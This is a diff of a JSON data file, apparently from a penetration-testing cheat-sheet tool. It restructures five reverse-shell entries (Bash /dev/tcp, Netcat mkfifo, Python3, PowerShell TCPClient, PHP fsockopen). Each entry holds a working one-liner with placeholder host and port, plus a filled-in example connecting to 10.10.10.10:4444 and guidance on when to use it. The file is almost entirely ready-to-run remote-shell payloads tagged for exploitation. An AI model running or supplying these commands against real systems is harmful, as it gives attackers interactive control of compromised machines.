@@ -1,115 +1,77 @@
 [
   {
     "id": "revshell-bash-tcp",
-    "module_id": "module-revshells",
-    "title": "Bash TCP Reverse Shell",
-    "description": "A classic reverse shell using Bash's built-in /dev/tcp device file.",
-    "command": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
-    "syntax_language": "bash",
-    "tags": [
-      "bash",
-      "reverse shell",
-      "linux"
-    ],
-    "platforms": [
-      "linux",
-      "mac"
-    ],
-    "when_to_use": "When you have command execution on a Linux system and bash is available.",
+    "tool": "Bash",
+    "category": "Reverse Shells",
     "scenario_tags": [
       "reverse-shell",
-      null
-    ]
+      "exploitation"
+    ],
+    "platform": "linux",
+    "title": "Bash TCP Reverse Shell",
+    "command": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+    "description": "A classic reverse shell using Bash's built-in /dev/tcp device file.",
+    "when_to_use": "When you have command execution on a Linux system and bash is available.",
+    "example": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
   },
   {
     "id": "revshell-nc-mkfifo",
-    "module_id": "module-revshells",
-    "title": "Netcat (nc) mkfifo Reverse Shell",
-    "description": "Reverse shell using standard Netcat and a named pipe (mkfifo). Useful when the target's nc version doesn't support the -e flag.",
-    "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
-    "syntax_language": "bash",
-    "tags": [
-      "netcat",
-      "nc",
-      "reverse shell",
-      "linux"
-    ],
-    "platforms": [
-      "linux",
-      "mac"
-    ],
-    "when_to_use": "When 'nc -e' is not supported (OpenBSD netcat) but nc is installed.",
+    "tool": "Netcat",
+    "category": "Reverse Shells",
     "scenario_tags": [
       "reverse-shell",
-      null
-    ]
+      "exploitation"
+    ],
+    "platform": "linux",
+    "title": "Netcat (nc) mkfifo Reverse Shell",
+    "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
+    "description": "Reverse shell using standard Netcat and a named pipe (mkfifo). Useful when the target's nc version doesn't support the -e flag.",
+    "when_to_use": "When 'nc -e' is not supported (OpenBSD netcat) but nc is installed.",
+    "example": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.10.10 4444 >/tmp/f"
   },
   {
     "id": "revshell-python3",
-    "module_id": "module-revshells",
-    "title": "Python3 Reverse Shell",
-    "description": "A one-liner Python 3 reverse shell using the socket and subprocess modules.",
-    "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
-    "syntax_language": "python",
-    "tags": [
-      "python",
-      "python3",
-      "reverse shell",
-      "linux"
-    ],
-    "platforms": [
-      "linux",
-      "mac",
-      "windows"
-    ],
-    "when_to_use": "When python3 is installed on the target system.",
+    "tool": "Python3",
+    "category": "Reverse Shells",
     "scenario_tags": [
       "reverse-shell",
-      null
-    ]
+      "exploitation"
+    ],
+    "platform": "cross-platform",
+    "title": "Python3 Reverse Shell",
+    "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
+    "description": "A one-liner Python 3 reverse shell using the socket and subprocess modules.",
+    "when_to_use": "When python3 is installed on the target system.",
+    "example": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
   },
   {
     "id": "revshell-powershell",
-    "module_id": "module-revshells",
-    "title": "PowerShell Reverse Shell",
-    "description": "A standard PowerShell reverse shell.",
-    "command": "$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
-    "syntax_language": "powershell",
-    "tags": [
-      "powershell",
-      "windows",
-      "reverse shell"
-    ],
-    "platforms": [
-      "windows"
-    ],
-    "when_to_use": "When you have command execution on a Windows machine via PowerShell.",
+    "tool": "PowerShell",
+    "category": "Reverse Shells",
     "scenario_tags": [
       "reverse-shell",
-      null
-    ]
+      "exploitation"
+    ],
+    "platform": "windows",
+    "title": "PowerShell Reverse Shell",
+    "command": "$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+    "description": "A standard PowerShell reverse shell.",
+    "when_to_use": "When you have command execution on a Windows machine via PowerShell.",
+    "example": "$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
   },
   {
     "id": "revshell-php",
-    "module_id": "module-revshells",
-    "title": "PHP Reverse Shell",
-    "description": "A simple PHP reverse shell executing a shell via exec().",
-    "command": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"bash -i <&3 >&3 2>&3\");'",
-    "syntax_language": "php",
-    "tags": [
-      "php",
-      "reverse shell",
-      "web"
-    ],
-    "platforms": [
-      "linux",
-      "mac",
-      "windows"
-    ],
-    "when_to_use": "When you can execute PHP code on the target server.",
+    "tool": "PHP",
+    "category": "Reverse Shells",
     "scenario_tags": [
       "reverse-shell",
-      null
-    ]
+      "exploitation"
+    ],
+    "platform": "cross-platform",
+    "title": "PHP Reverse Shell",
+    "command": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"bash -i <&3 >&3 2>&3\");'",
+    "description": "A simple PHP reverse shell executing a shell via exec().",
+    "when_to_use": "When you can execute PHP code on the target server.",
+    "example": "php -r '$sock=fsockopen(\"10.10.10.10\",4444);exec(\"bash -i <&3 >&3 2>&3\");'"
   }
 ]
